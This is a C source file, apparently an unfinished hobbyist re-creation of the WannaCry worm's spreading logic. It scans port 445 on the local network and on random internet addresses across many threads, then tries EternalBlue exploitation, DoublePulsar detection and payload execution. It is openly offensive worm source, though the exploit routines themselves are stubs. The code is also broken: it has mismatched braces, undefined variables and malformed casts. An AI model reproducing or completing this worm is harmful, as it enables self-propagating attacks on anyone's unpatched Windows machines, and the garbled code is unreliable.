//https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/
//skeleton code at this moment
//still a work in progress

//https://stackoverflow.com/questions/37838490/how-to-properly-set-a-flag-in-the-write-fds-and-select-in-c
int canConnectToPort445(char *ip)
{
	struct sockaddr name;
	struct timeval timeout;
	fd_set writefds;
	SOCKET control_sock;
	u_long argp;
	int result;
	
     	FD_ZERO(&writefds);    

	name.sin_family = AF_INET;
	name.sin_addr.s_addr = inet_addr(ip);
	name.sin_port = htons(445);

	control_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(control_sock == -1)
	{
		result = 0;
	} else {
		ioctlsocket(control_sock, FIONBIO, &argp);
	 	writefds.fd_array[0] = control_sock;
		writefds.fd_count = 1;
		timeout.tv_sec = 1;
    		timeout.tv_usec = 0;
		connect(control_sock, (struct sockaddr*)&name, sizeof(name));
		int ret = select(0, 0, &writefds, 0, &timeout);
		closesocket(control_sock);
		result = ret;
	}
	return result;
}

DWORD MS17_010(DWORD LPPARAM)
{
	lpparam = (struct in_addr) ;
	int attemptCount;
	//CheckMS17Vulnerability here; continue if vulnerable
	if ( CheckForEternalBlue(&target, 445))
	{
		attemptCount = 0;
		do
		{
			Sleep(3000);
			if ( IsDOUBLEPULSARInstalled(&target, 1, 445) )
			      break;
		      	Sleep(3000);
			//EternalBlue pwn here
		      	EternalBluePwn(&target, 445);
		      	++attemptCount;
		 } while ( attemptCount < 5 );
	}
	Sleep(3000);
	if ( IsDOUBLEPULSARInstalled(&target, 1, 445))
	{
		runPayloadOnTarget(&target, 1, 445);
	}
	endthreadex(0);
	return 0;
}
			      
int scanIP(void *arg)
{
	char *target = (char*)arg;
	HANDLE ExploitHandle;
	if (canConnectToPort445(target) > 0)
	{
		ExploitHandle = (HANDLE)_beginthreadex(NULL, MS17_010, target, 0, 0);
		//Not sure if the if statement is needed but we'll keep it here for now
		if( ExploitHandle )
		{
			if (WaitForSingleObject(ExploitHandle, 60000) == 258 ))
			{
				TerminateThread(ExploitHandle, 0);
      				CloseHandle(ExploitHandle);
			}
		}
	}
	endthreadex(0);
  	return 0;
}

int __stdcall LANThreadFunc(void *param)
{
	//Obtain local IP address


	//Generate other IP addresses
	char local_generated_ip;
	
	HANDLE ScanIPHandle;
	ScanIPHandle = (HANDLE)_beginthreadex(0, 0, scanIP, local_generated_ip, 0, 0);

	if( ScanIPHandle )
	{
		if (WaitForSingleObject(ScanIPHandle, 60000) == 258 ))
		{
			TerminateThread(ScanIPHandle, 0);
      			CloseHandle(ScanIPHandle);
	}
}

int __stdcall WANThreadFunc(void *param)
{
	srand(GetTickCount());
	//Generate IP address
	char *generated_ip[16];
	sprintf(generated_ip, "%d.%d.%d.%d", rand() % 254, rand() % 254, rand() % 254, rand() % 254 );
	
	HANDLE ScanIPHandle;
	ScanIPHandle = (HANDLE)_beginthreadex(0, 0, scanIP, generated_ip, 0, 0);

	if( ScanIPHandle )
	{
		if (WaitForSingleObject(ExploitHandle, 60000) == 258 ))
		{
			TerminateThread(ExploitHandle, 0);
      			CloseHandle(ExploitHandle);
			
	}
}

/*
Threading: https://www.bogotobogo.com/cplusplus/multithreaded2A.php
http://simplesamples.info/windows/_beginthreadex.aspx
https://jeffpar.github.io/kbarchive/kb/132/Q132078/
https://www.programmersought.com/article/57053139965/
https://sodocumentation.net/winapi/topic/1756/process-and-thread-management
*/
int threadScanMain()
{
	HANDLE LanThread;
	LanThread = (HANDLE)_beginthreadex(NULL, NULL, LANThreadFunc, 0, 0, 0);
	
	int thread_count = 0;
	DWORD dwThreadIdArray[128];
  	HANDLE hThreadArray[128];
	do
	{
    		hThreadArray[i] = CreateThread(NULL, 0, WANThreadFunc, NULL, 0, &dwThreadIdArray[i]);
		thread_count++;
		Sleep(2000);
  	}
	}while(thread_count <= 128);
}
